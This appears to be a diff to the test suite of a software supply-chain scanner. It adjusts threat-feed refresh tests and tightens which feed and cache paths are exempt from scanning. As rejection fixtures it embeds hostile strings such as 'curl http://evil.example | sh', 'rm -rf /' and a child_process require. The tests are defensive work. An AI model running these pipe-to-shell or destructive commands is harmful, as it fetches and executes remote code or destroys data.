@@ -35,6 +35,11 @@ import {
   type FeedIOC,
 } from "../threat-intel.js";
 
+const NO_FLOOR = { minEntries: 0 }; // fixtures hold a few entries, far below half the bundled feed
+// These suites exercise transport, cache safety and catalog behaviour with unsigned local
+// routes; feed-signature.test.ts covers the signature check itself.
+const ALLOW_UNSIGNED = { allowUnsigned: true };
+
 const GEN_SCRIPT_URL = new URL("../../scripts/generate-feed.mjs", import.meta.url).href;
 const IMPORT_SCRIPT_URL = new URL("../../scripts/import-threat-feed.mjs", import.meta.url).href;
 const REPO_FEED_JSON = fileURLToPath(new URL("../../feed.json", import.meta.url));
@@ -402,7 +407,7 @@ describe("refreshFeed", () => {
       mockHttpResponse(200, [
         JSON.stringify({ schema: 1, package: "supply-chain-guard", version: "9.9.9", entryCount: 1, entries: [EXTRA_DOMAIN_IOC] }),
       ]);
-      const result = await refreshFeed("https://feed.invalid/feed.json");
+      const result = await refreshFeed("https://feed.invalid/feed.json", undefined, NO_FLOOR, ALLOW_UNSIGNED);
       expect(result.cachePath).toBe(path.join(tmpDir, FEED_CACHE_FILE));
       resetThreatIntelCache();
       expect(loadThreatIntel().some((ioc) => ioc.value === EXTRA_DOMAIN)).toBe(true);
@@ -423,7 +428,7 @@ describe("refreshFeed", () => {
     });
     mockHttpResponse(200, [body]);
 
-    const result = await refreshFeed("https://feed.invalid/feed.json", tmpDir);
+    const result = await refreshFeed("https://feed.invalid/feed.json", tmpDir, NO_FLOOR, ALLOW_UNSIGNED);
     expect(result.entryCount).toBe(1);
     expect(result.cachePath).toBe(path.join(tmpDir, FEED_CACHE_FILE));
     // The FEED is fetched exactly once. This used to assert the total call
@@ -455,13 +460,13 @@ describe("refreshFeed", () => {
     const mid = Math.floor(body.length / 2);
     mockHttpResponse(200, [body.slice(0, mid), body.slice(mid)]);
 
-    const result = await refreshFeed("https://feed.invalid/feed.json", tmpDir);
+    const result = await refreshFeed("https://feed.invalid/feed.json", tmpDir, NO_FLOOR, ALLOW_UNSIGNED);
     expect(result.entryCount).toBe(1);
   });
 
-  it("defaults to the published GitHub raw URL", async () => {
+  it("defaults to the signed feed of the latest GitHub Release", async () => {
     mockHttpResponse(200, [JSON.stringify({ schema: 1, entries: [EXTRA_DOMAIN_IOC] })]);
-    await refreshFeed(undefined, tmpDir);
+    await refreshFeed(undefined, tmpDir, NO_FLOOR, ALLOW_UNSIGNED);
     // The bounded downloader parses the URL and passes RequestOptions, so the
     // destination is reassembled from the parts rather than compared as a string.
     const options = (https.get as unknown as MockedGet).mock.calls[0][0] as {
@@ -471,13 +476,13 @@ describe("refreshFeed", () => {
     };
     expect(`${options.protocol}//${options.hostname}${options.path}`).toBe(DEFAULT_FEED_URL);
     expect(DEFAULT_FEED_URL).toContain(
-      "raw.githubusercontent.com/homeofe/supply-chain-guard/main/feed.json",
+      "github.com/homeofe/supply-chain-guard/releases/latest/download/feed.json",
     );
   });
 
   it("rejects with a clear error when the network is down (no crash)", async () => {
     mockHttpError("getaddrinfo ENOTFOUND raw.githubusercontent.com");
-    await expect(refreshFeed("https://feed.invalid/feed.json", tmpDir)).rejects.toThrow(
+    await expect(refreshFeed("https://feed.invalid/feed.json", tmpDir, NO_FLOOR, ALLOW_UNSIGNED)).rejects.toThrow(
       /Failed to refresh threat feed.*ENOTFOUND/,
     );
     expect(fs.existsSync(path.join(tmpDir, FEED_CACHE_FILE))).toBe(false);
@@ -485,14 +490,14 @@ describe("refreshFeed", () => {
 
   it("rejects on non-200 HTTP status", async () => {
     mockHttpResponse(404, ["Not Found"]);
-    await expect(refreshFeed("https://feed.invalid/feed.json", tmpDir)).rejects.toThrow(
+    await expect(refreshFeed("https://feed.invalid/feed.json", tmpDir, NO_FLOOR, ALLOW_UNSIGNED)).rejects.toThrow(
       /Failed to refresh threat feed.*failed with status 404/,
     );
   });
 
   it("rejects on invalid payloads without writing the cache", async () => {
     mockHttpResponse(200, ["<html>rate limited</html>"]);
-    await expect(refreshFeed("https://feed.invalid/feed.json", tmpDir)).rejects.toThrow(
+    await expect(refreshFeed("https://feed.invalid/feed.json", tmpDir, NO_FLOOR, ALLOW_UNSIGNED)).rejects.toThrow(
       /Failed to refresh threat feed.*not valid JSON/,
     );
     expect(fs.existsSync(path.join(tmpDir, FEED_CACHE_FILE))).toBe(false);
@@ -509,6 +514,7 @@ describe("cached-feed consumption at scan time", () => {
       path.join(tmpDir, FEED_CACHE_FILE),
       JSON.stringify({
         timestamp: new Date(Date.now() - ageMs).toISOString(),
+        unsigned: true,
         entries,
       }),
     );
@@ -621,24 +627,30 @@ describe("isInertThreatFeedFile", () => {
     version: "5.4.0",
     entryCount: 2,
     entries: [
-      { type: "domain", value: "evil-c2.example", severity: "critical", confidence: 1.0 },
+      { type: "package", value: "evil-pkg@1.0.0", severity: "critical", confidence: 1.0 },
       { type: "package", value: "bad-pkg@1.0.0", severity: "high", confidence: 0.9, campaign: "Test" },
     ],
   });
 
-  it("accepts the published feed document shape under feed.json", async () => {
+  it("accepts the published feed document shape under the cache path", async () => {
     const { isInertThreatFeedFile } = await import("../threat-intel.js");
-    expect(isInertThreatFeedFile("feed.json", goodDoc)).toBe(true);
-    expect(isInertThreatFeedFile("sub/dir/feed.json", goodDoc)).toBe(true);
+    expect(isInertThreatFeedFile(".scg-cache/threat-feed.json", goodDoc)).toBe(true);
+    // A root feed.json is exempt only as this project's own digest-verified file.
+    expect(isInertThreatFeedFile("feed.json", goodDoc)).toBe(false);
+    // Only the project's own path: a basename match let any scanned package
+    // carry a file called feed.json at any depth that every scanner skipped.
+    expect(isInertThreatFeedFile("sub/dir/feed.json", goodDoc)).toBe(false);
   });
 
-  it("accepts the cache shape under threat-feed.json", async () => {
+  it("accepts the cache shape under .scg-cache/threat-feed.json only", async () => {
     const { isInertThreatFeedFile } = await import("../threat-intel.js");
     const cacheDoc = JSON.stringify({
       timestamp: "2026-07-02T00:00:00Z",
-      entries: [{ type: "ip", value: "192.0.2.99", severity: "critical", confidence: 1.0 }],
+      entries: [{ type: "package", value: "evil-pkg@1.0.0", severity: "critical", confidence: 1.0 }],
     });
-    expect(isInertThreatFeedFile("threat-feed.json", cacheDoc)).toBe(true);
+    expect(isInertThreatFeedFile(".scg-cache/threat-feed.json", cacheDoc)).toBe(true);
+    expect(isInertThreatFeedFile("threat-feed.json", cacheDoc)).toBe(false);
+    expect(isInertThreatFeedFile("lib/.scg-cache/threat-feed.json", cacheDoc)).toBe(false);
   });
 
   it("rejects other filenames even with a valid feed body", async () => {
@@ -650,25 +662,25 @@ describe("isInertThreatFeedFile", () => {
     const { isInertThreatFeedFile } = await import("../threat-intel.js");
     const doc = JSON.parse(goodDoc);
     doc.postinstall = "curl http://evil.example | sh";
-    expect(isInertThreatFeedFile("feed.json", JSON.stringify(doc))).toBe(false);
+    expect(isInertThreatFeedFile(".scg-cache/threat-feed.json", JSON.stringify(doc))).toBe(false);
   });
 
   it("rejects entries with unknown keys or non-scalar values", async () => {
     const { isInertThreatFeedFile } = await import("../threat-intel.js");
     const extraKey = JSON.parse(goodDoc);
     extraKey.entries[0].exec = "require('child_process')";
-    expect(isInertThreatFeedFile("feed.json", JSON.stringify(extraKey))).toBe(false);
+    expect(isInertThreatFeedFile(".scg-cache/threat-feed.json", JSON.stringify(extraKey))).toBe(false);
     const nested = JSON.parse(goodDoc);
     nested.entries[0].value = { $ref: "http://evil.example" };
-    expect(isInertThreatFeedFile("feed.json", JSON.stringify(nested))).toBe(false);
+    expect(isInertThreatFeedFile(".scg-cache/threat-feed.json", JSON.stringify(nested))).toBe(false);
   });
 
   it("rejects a foreign package claim and invalid JSON", async () => {
     const { isInertThreatFeedFile } = await import("../threat-intel.js");
     const foreign = JSON.parse(goodDoc);
     foreign.package = "totally-legit-scanner";
-    expect(isInertThreatFeedFile("feed.json", JSON.stringify(foreign))).toBe(false);
-    expect(isInertThreatFeedFile("feed.json", "{ not json")).toBe(false);
+    expect(isInertThreatFeedFile(".scg-cache/threat-feed.json", JSON.stringify(foreign))).toBe(false);
+    expect(isInertThreatFeedFile(".scg-cache/threat-feed.json", "{ not json")).toBe(false);
   });
 
   it("integration: a repo containing the real published feed.json scans clean", async () => {
@@ -889,7 +901,7 @@ describe("isInertThreatFeedFile, exemption boundary", () => {
 
     const entries = JSON.parse(real).entries.slice(0, 50);
     const cache = JSON.stringify({ timestamp: "2026-09-16T00:00:00Z", entries });
-    expect(isInertThreatFeedFile("threat-feed.json", cache)).toBe(true);
+    expect(isInertThreatFeedFile(".scg-cache/threat-feed.json", cache)).toBe(true);
   });
 
   // `note` and `ecosystem` were in FEED_ENTRY_KEYS but are not FeedIOC fields,
@@ -898,11 +910,11 @@ describe("isInertThreatFeedFile, exemption boundary", () => {
   // bounding the length was not enough and the keys were removed outright.
   it("rejects the legacy free-text keys that widened the exemption", async () => {
     const { isInertThreatFeedFile } = await import("../threat-intel.js");
-    expect(isInertThreatFeedFile("feed.json", doc([{ ...ok, note: "curl https://evil.example/x | bash" }]))).toBe(false);
-    expect(isInertThreatFeedFile("feed.json", doc([{ ...ok, ecosystem: "rm -rf /" }]))).toBe(false);
+    expect(isInertThreatFeedFile(".scg-cache/threat-feed.json", doc([{ ...ok, note: "curl https://evil.example/x | bash" }]))).toBe(false);
+    expect(isInertThreatFeedFile(".scg-cache/threat-feed.json", doc([{ ...ok, ecosystem: "rm -rf /" }]))).toBe(false);
     // Short enough to pass any length bound, which is why a length bound was
     // the wrong fix.
-    expect(isInertThreatFeedFile("feed.json", doc([{ ...ok, note: "x" }]))).toBe(false);
+    expect(isInertThreatFeedFile(".scg-cache/threat-feed.json", doc([{ ...ok, note: "x" }]))).toBe(false);
   });
 
   // Key-and-scalar checking alone accepts documents that are merely feed-SHAPED.
@@ -910,22 +922,22 @@ describe("isInertThreatFeedFile, exemption boundary", () => {
     const { isInertThreatFeedFile, isValidFeedIOC } = await import("../threat-intel.js");
     const noSeverity = { type: "package", value: "z@1" };
     expect(isValidFeedIOC(noSeverity)).toBe(false);
-    expect(isInertThreatFeedFile("feed.json", doc([noSeverity]))).toBe(false);
+    expect(isInertThreatFeedFile(".scg-cache/threat-feed.json", doc([noSeverity]))).toBe(false);
 
-    expect(isInertThreatFeedFile("feed.json", doc([{ ...ok, severity: "catastrophic" }]))).toBe(false);
-    expect(isInertThreatFeedFile("feed.json", doc([{ ...ok, confidence: 7 }]))).toBe(false);
+    expect(isInertThreatFeedFile(".scg-cache/threat-feed.json", doc([{ ...ok, severity: "catastrophic" }]))).toBe(false);
+    expect(isInertThreatFeedFile(".scg-cache/threat-feed.json", doc([{ ...ok, confidence: 7 }]))).toBe(false);
   });
 
   // One bad entry among good ones must fail the whole file: a partial
   // exemption would let the bad line ride along unscanned.
   it("rejects the file when a single entry is bad", async () => {
     const { isInertThreatFeedFile } = await import("../threat-intel.js");
-    expect(isInertThreatFeedFile("feed.json", doc([ok, ok, { ...ok, note: "payload" }, ok]))).toBe(false);
+    expect(isInertThreatFeedFile(".scg-cache/threat-feed.json", doc([ok, ok, { ...ok, note: "payload" }, ok]))).toBe(false);
   });
 
   it("still accepts a well-formed minimal document", async () => {
     const { isInertThreatFeedFile } = await import("../threat-intel.js");
-    expect(isInertThreatFeedFile("feed.json", doc([ok]))).toBe(true);
+    expect(isInertThreatFeedFile(".scg-cache/threat-feed.json", doc([ok]))).toBe(true);
   });
 
   // FEED_ENTRY_KEYS must stay a faithful description of FeedIOC. A key that
@@ -940,7 +952,7 @@ describe("isInertThreatFeedFile, exemption boundary", () => {
 
     const probe = Object.fromEntries([...used].map((k) => [k, (ok as Record<string, unknown>)[k]
       ?? (k === "firstSeen" ? "2026-09-16" : "x")]));
-    expect(isInertThreatFeedFile("feed.json", doc([{ ...ok, ...probe }]))).toBe(true);
+    expect(isInertThreatFeedFile(".scg-cache/threat-feed.json", doc([{ ...ok, ...probe }]))).toBe(true);
     expect(used.has("note")).toBe(false);
     expect(used.has("ecosystem")).toBe(false);
   });
